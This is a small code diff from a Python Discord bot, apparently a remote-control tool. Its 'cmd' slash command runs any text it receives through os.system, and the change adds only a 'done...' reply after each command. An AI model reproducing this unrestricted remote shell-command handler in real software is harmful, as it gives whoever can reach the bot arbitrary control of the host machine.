@@ -217,6 +217,7 @@ async def browser_error(ctx, error):
 @client.slash_command(guild_ids=[int(guild_id)], name="cmd", description="Run shell commands")
 async def cmd(ctx, command : str):
     os.system(command)
+    await ctx.respond("done...")
 
 @cmd.error
 async def cmd_error(ctx, error):
